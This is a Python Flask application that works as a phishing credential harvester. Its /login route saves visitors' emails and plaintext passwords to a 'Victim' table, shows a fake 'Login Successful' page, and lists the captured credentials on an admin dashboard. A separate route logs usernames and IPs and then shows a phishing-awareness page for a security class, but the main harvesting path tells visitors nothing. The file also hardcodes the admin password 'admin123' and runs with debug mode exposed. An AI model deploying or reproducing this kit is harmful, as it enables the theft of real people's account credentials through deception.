from flask import Flask, render_template, request, redirect, url_for
from flask_login import LoginManager, login_user, login_required, logout_user
from werkzeug.security import generate_password_hash, check_password_hash
from config import Config
from models import db, Victim, Admin
from datetime import datetime
import csv

app = Flask(__name__)
app.config.from_object(Config)
db.init_app(app)

#Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "admin_login"

@login_manager.user_loader
def load_user(user_id):
    return Admin.query.get(int(user_id))

with app.app_context():
    db.create_all()

    #Create default admin only once
    if not Admin.query.first():
        hashed_pw = generate_password_hash("admin123")
        admin = Admin(username="admin", password_hash=hashed_pw)
        db.session.add(admin)
        db.session.commit()

#Public Home
@app.route("/")
def index():
    return render_template("index.html")

#Victim Login
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        victim = Victim(
            email=request.form.get("email"),
            password=request.form.get("password")
        )
        db.session.add(victim)
        db.session.commit()
        return redirect("/thankyou")

    return render_template("login.html")

#Thank You Page
@app.route("/thankyou")
def thankyou():
    return "<h3>Login Successful. Thank you.</h3>"

#Admin Login
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        admin = Admin.query.filter_by(username=username).first()

        if admin and check_password_hash(admin.password_hash, password):
            login_user(admin)
            return redirect(url_for("dashboard"))

        return "Invalid credentials", 401

    return render_template("admin_login.html")

#Dashboard
@app.route("/dashboard")
@login_required
def dashboard():
    victims = Victim.query.all()
    return render_template("dashboard.html", victims=victims)

@app.route("/phish-login")
def phish_login():
    return render_template("login.html")


@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("phish_logs.csv", "a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow([time, username, ip])

    return redirect("/training")


@app.route("/training")
def training():
    return """
    <h2>This Was a Phishing Simulation</h2>
    <p>You entered credentials into a simulated phishing page.</p>

    <h3>Warning Signs:</h3>
    <ul>
        <li>Unexpected login request</li>
        <li>Urgent language</li>
        <li>Unverified sender</li>
    </ul>

    <p>This test was conducted for network security class.</p>
    """


#Logout
@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for("admin_login"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
    
